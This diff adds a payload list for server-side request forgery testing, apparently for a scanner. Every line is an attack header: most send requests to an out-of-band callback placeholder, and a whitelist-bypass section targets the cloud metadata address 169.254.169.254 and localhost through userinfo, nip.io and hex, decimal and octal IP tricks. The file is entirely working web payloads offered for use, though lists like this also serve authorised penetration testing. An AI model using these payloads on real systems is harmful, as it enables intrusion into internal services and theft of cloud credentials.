@@ -1,0 +1,38 @@
+# SSRF via headers — OOB callback ($collabplz) + whitelist bypass (google.com as trusted domain)
+# OOB marker: $collabplz (auto-replaced by Burp Collaborator, or use -oob <domain>)
+# Fingerprints: fingerprints/ssrf.txt (nuclei-style regexes)
+X-Forwarded-Host: $collabplz
+X-Host: $collabplz
+X-Forwarded-Server: $collabplz
+X-HTTP-Host-Override: $collabplz
+X-Forwarded-URL: http://$collabplz/ssrf
+X-Original-URL: http://$collabplz/ssrf
+X-Rewrite-URL: http://$collabplz/ssrf
+X-Url: http://$collabplz/ssrf
+X-Proxy-URL: http://$collabplz/ssrf
+X-Proxy-Host: $collabplz
+X-Callback: http://$collabplz/callback
+X-Webhook: http://$collabplz/webhook
+X-Webhook-URL: http://$collabplz/webhook
+X-Notify-URL: http://$collabplz/notify
+X-Import-URL: http://$collabplz/import
+X-Resource-URL: http://$collabplz/resource
+X-Image-URL: http://$collabplz/img.png
+X-Avatar-URL: http://$collabplz/avatar.png
+X-Wap-Profile: http://$collabplz/wap.xml
+Referer: http://$collabplz/ssrf
+X-Originating-URL: http://$collabplz/ssrf
+# --- whitelist bypass: google.com is the allowed/trusted domain ---
+X-Forwarded-Host: google.com
+Referer: https://google.com
+X-Forwarded-Site: https://google.com
+X-Url: https://google.com
+X-Url: http://google.com@169.254.169.254/latest/meta-data/
+X-Url: http://google.com@127.0.0.1/
+X-Url: https://google.com@localhost/
+X-Url: http://google.com.127.0.0.1.nip.io/
+X-Url: //127.0.0.1/
+X-Url: http://[::1]/
+X-Url: http://0x7f000001/
+X-Url: http://2130706433/
+X-Url: http://017700000001/
